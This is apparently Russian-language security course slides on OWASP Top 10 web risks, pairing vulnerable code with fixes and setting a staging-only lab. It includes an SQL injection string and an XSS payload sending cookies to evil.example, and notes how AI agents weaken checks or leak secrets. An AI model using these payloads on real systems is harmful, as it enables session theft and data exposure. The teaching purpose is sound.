A01: контроль доступа и IDOR

Перебор id — и видны чужие записи

@app.get("/api/bookings/{booking_id}")
async def get_booking(booking_id: int):
    return await repo.get_booking(booking_id)

Проверяем владельца

@app.get("/api/bookings/{booking_id}")
async def get_booking(
        booking_id: int,
        user: User = Depends(current_user)):
    booking = await repo.get_booking(booking_id)
    if booking is None or not user.can_view(booking):
        raise HTTPException(404)
    return booking

«Залогинен» ≠ «имеет право на этот объект». 404, а не 403: не подтверждаем, что запись существует.

A05: SQL-инъекция

Ввод пользователя становится частью SQL

await db.fetch(f"SELECT * FROM bookings WHERE client_phone = '{phone}'")
# phone = "' OR '1'='1"  →  все записи всех клиентов

Параметризованный запрос: ввод отдельно от SQL

await db.fetch("SELECT * FROM bookings WHERE client_phone = $1", phone)

ORM параметризуют сами — опасны «сырые» строки и f"..." в SQL. То же для командной строки.

A05: XSS — чужой скрипт на вашей странице

Отзыв клиента:
<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
  • React и Vue экранируют вывод — опасны dangerouslySetInnerHTML, v-html, Markdown → HTML без очистки
  • Ответ LLM (Модуль 7) — тоже недоверенный ввод
  • Очистка HTML — DOMPurify; на сервере — проверка и ограничение формата
  • Content Security Policy — второй рубеж: браузер не выполнит скрипт с чужого домена

CSRF, cookie и CORS

  • Cookie сессии: HttpOnly, Secure, SameSite; изменения — только POST/PATCH/DELETE
  • CORS — только свои домены; * вместе с cookie — ошибка. CORS не защищает сервер: curl его игнорирует

A02: ошибки конфигурации

  1. Отладка DEBUG=True в продакшене → стектрейсы и настройки видны всем
  2. Пароли по умолчанию: postgres/postgres, admin/admin
  3. Порты PostgreSQL, Redis, панель Docker открыты в интернет
  4. Файлы открытый /.env, /.git в корне сайта
  5. Ошибки «пользователь не найден» vs «неверный пароль» — подсказка для перебора

Проверка: nmap своего сервера снаружи — открыты должны быть только 22, 80, 443.

A06: злоупотребление бизнес-логикой

Бот за минуту записывается на все слоты пятницы на вымышленные номера. Ни одной «уязвимости» — всё по API.

Лимиты

Не больше 2 активных записей на телефон; лимиты на IP и устройство.

Подтверждение

Код в Telegram или SMS; автоотмена неподтверждённых через 15 минут.

Наблюдение

Капча — только при аномалиях; алерт мастеру при всплеске записей.

Такие угрозы находит модель угроз, а не сканер.

A03: цепочка поставок

  • 90% кода вашего приложения — чужие пакеты
  • Lock-файлы и фиксированные версии; хэши пакетов (uv lock, pip --require-hashes, package-lock.json)
  • pip-audit, npm audit, Dependabot / Renovate — известные уязвимости и PR с обновлениями
  • Trivy — уязвимости в образах; SBOM (Syft) — список всего, что внутри

Slopsquatting

ИИ-агент советует пакет, которого не существует, — злоумышленник регистрирует это имя. Перед установкой проверяйте, что пакет реальный и популярный.

Персональные данные

Минимизация

Для записи хватит имени и телефона. Не собирайте лишнего.

Шифрование

При передаче — TLS; при хранении — шифрование диска или БД; бэкапы — тоже.

Логи

Маскирование: +7******4567. Никаких токенов и паролей.

  • Сроки хранения: удалять или обезличивать старые записи
  • Доступ сотрудников — по необходимости и с журналом; требования закона — Модуль 12

Логи, алерты и ошибки

  • Логируйте: входы и неудачи, отказы в доступе, действия администраторов, смену настроек
  • Алерты: всплеск 401/403, много неудачных входов, резкий рост записей
  • Клиенту — общее сообщение и request_id; подробности — только в логах
  • Fail closed: если проверка прав упала с ошибкой — доступ запрещён, а не разрешён

Проверка падает → PR не сливается. Ложные срабатывания разбирают и помечают, а не отключают проверку целиком.

Безопасность и ИИ-агенты

  1. Ревью код агента проверяется так же строго, как код стажёра
  2. Ловушка агенты «чинят» падающую проверку, отключая её или ослабляя правило
  3. Секреты агент может записать ключ в лог, тест или коммит — gitleaks ловит это в CI
  4. Инъекции инструкции в issue, README или зависимостях — данные, а не команды
  5. Польза агент хорошо ищет уязвимости по чек-листу — но каждую находку проверяйте

Лабораторная работа

  1. Модель угроз «Slot» на одну страницу
  2. Только на своём staging, в паре: IDOR, SQL-инъекция, XSS через отзыв, перебор пароля, массовая запись скриптом
  3. Базовое сканирование OWASP ZAP; исправьте находки, добавьте заголовки и лимиты
  4. В CI: gitleaks, Semgrep, pip-audit/npm audit, Trivy
  5. С агентом: проверка по чек-листу OWASP и тесты, воспроизводящие каждую уязвимость до исправления; каждую находку проверьте сами
